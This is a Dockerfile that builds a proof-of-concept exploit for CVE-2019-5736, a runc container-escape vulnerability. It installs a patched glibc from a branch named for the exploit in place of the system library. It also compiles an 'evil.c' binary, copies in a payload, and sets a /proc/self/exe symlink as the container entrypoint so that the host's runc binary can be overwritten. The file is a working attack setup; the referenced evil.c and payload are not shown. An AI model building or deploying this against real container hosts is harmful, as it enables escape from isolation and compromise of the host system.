FROM fedora:29

RUN dnf -y install git make automake autoconf cmake gcc gcc-c++ vim curl && \
    dnf -y install wget bison flex findutils procps && \
    git clone https://github.com/milloni/glibc.git

WORKDIR /glibc
RUN git checkout milloni/cve-2019-5736-exp && \
    mkdir build && \
    cd build && \
    ../configure --prefix=/usr && \
    make -j6 && \
    mkdir /glibc.inst && \
    make DESTDIR=/glibc.inst -j6 install && \
    cp /lib64/libc-2.28.so /glibc.inst

RUN cp /lib64/libc-2.28.so /lib64/libc-2.28.so.old && \
    ln -sf /lib64/libc-2.28.so.old /lib64/libc.so.6 && \
    rm /lib64/libc-2.28.so

RUN cp /glibc.inst/lib64/libc-2.28.so /lib64/ && \
    ln -sf /lib64/libc-2.28.so /lib64/libc.so.6

COPY . /src
RUN gcc -o /evil /src/evil.c && \
    ln -s /proc/self/exe /init && \
    cp /src/payload /

WORKDIR /
ENTRYPOINT /init
